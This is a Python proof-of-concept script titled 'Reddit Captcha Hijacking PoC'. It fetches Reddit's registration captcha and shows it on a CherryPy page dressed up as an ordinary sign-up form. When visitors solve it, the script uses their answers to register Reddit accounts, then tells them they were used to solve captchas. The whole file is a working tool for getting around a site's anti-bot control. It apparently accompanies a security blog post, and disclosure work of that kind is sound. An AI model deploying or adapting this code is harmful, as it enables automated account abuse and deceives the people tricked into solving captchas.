from random import choice
import cherrypy
import requests
import re
import os.path
import urllib2
import cookielib
import logging
import mechanize
""" AUTHOR: Shubham Shah """
""" Blog: http://blog.shubh.am/ """
""" Files under MIT License """
## Mechanize Approach!
cj = cookielib.LWPCookieJar()
br = mechanize.Browser()
br.set_cookiejar(cj)
br.set_handle_equiv(True)
br.set_handle_gzip(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
ualist= [line.rstrip() for line in open('useragents.txt')]
#random useragent from the 
ua = '{0}'.format(choice(ualist))
br.addheaders = [('User-agent', ua)]
br.open("http://www.reddit.com/register")
source_fixed1 = br.response().read()
#regex to find captcha name and also identification val
cap_iden1 = re.compile(r'value="[A-Za-z0-9]{32}')
captchai1 = cap_iden1.search(source_fixed1)
cident_raw1 = captchai1.group()
cident1 = captchai1.group()
cident1 = cident1.replace("value=\"", "")
captchaname1 = "captchas/" + cident1 + ".png"
captchaurl1 = "http://reddit.com/captcha/{0}.png".format(cident1)
## Requests Approach ! didn't work!!
url = 'http://www.reddit.com/register'
headers = {'User-Agent': '{0}'.format(choice(ualist)),
'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
'Referer': 'http://www.reddit.com/register'}
#cherrypy handling below
rsess = requests.Session()
regpage = rsess.get(url, headers=headers)
source = regpage.text
source_fixed = source.encode('ascii','ignore')
class reddit_cjack:
	def index(self):
		print captchaurl1
		#saving captcha as an image in the /captchas directory based off captchaname1 var
		with open(captchaname1, 'wb') as handle:
		    request = rsess.get(captchaurl1, headers=headers, stream=True)

		    for block in request.iter_content(1024):
		        if not block:
		            break
		        handle.write(block)
		return """<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
<meta charset="utf-8" />
<title>Reddit Captcha Hijacking PoC</title>
<link rel="stylesheet" href="css/master.css" type="text/css" />
<script language="javascript" type="text/javascript">
function randomString() {
	var chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz";
	var string_length = 8;
	var randomstring = '';
	for (var i=0; i<string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum,rnum+1);
	}
	document.randform.username.value = randomstring;
	document.randform.passw.value = 'ihackedthegibson101';
}
</script>
</head>
<body id="index">
        <div id="container">
            <div id="header"><h1>Captchajacking PoC - blog post <a href="http://blog.shubh.am/">here.</a></h1></div>
             <td><input type="submit" value="Fill form with random data" onClick="randomString();" /></td>            <div id="main">
                <form action="execute" method="post" name="randform">
                <table cellpadding="0" cellspacing="0" border="0">
                    <tr>
                        <td class="form-input-name">Username</td>
						<td class="input"><input name="username" type="username" placeholder="random" autocomplete="off" required="required" /></td>                    </tr>
                    <tr>
                        <td class="form-input-name">Password</td>
                        <td class="input"><input type="username" name="passw" placeholder="gibsonhacker101" autocomplete="off" required="required" /></td>
                    </tr>
        
                    <tr>
                        <td class="form-input-name">Captcha</td>
                        <td class="input">""" + """<img src=""" + captchaname1 + """></img>""" + """<textarea name="captcha" rows="5" cols="29" placeholder="Captcha Text"></textarea></td>
                    </tr>
                    <tr>
                        <td class="form-input-name"></td>

                        <td><input type="submit" value="Register" /></td>
                        
                    </tr>
                </table>
                </form>
            </div>
        </div>
</body>
</html>"""
	index.exposed = True
	def execute(self, username, passw, captcha):
		br.select_form(nr=0)
		br.form[ 'user' ] = username
		br.form[ 'passwd' ] = passw
		br.form[ 'passwd2' ] = passw
		br.form[ 'captcha' ] = captcha
		resp = br.submit()
		source_resp = resp.read()
		print username, passw, captcha
		if """username is already""" in source_resp:
			cj.clear()
			return "Username taken, please resubmit form with a more unique username."
		if """preferences""" in source_resp:
			return """Oh, did you think that you were registering on my website? Too bad, I used you to solve captchas!
			Reddit USN: {0} and Reddit PWD: {1}""".format(username,passw)
		if """doing that too much""" in source_resp:
			return """Reddit has blocked you from registering for a certain number of minutes, usually more than 5"""
		else:
			return source_resp
	execute.exposed= True
PATH = os.path.abspath(os.path.dirname(__file__))
conf = {
        '/': {
                'tools.staticdir.on': True,
                'tools.staticdir.dir': PATH,
            },
    }
cherrypy.tree.mount(reddit_cjack(), "/", config=conf)
cherrypy.engine.start()
cherrypy.engine.block()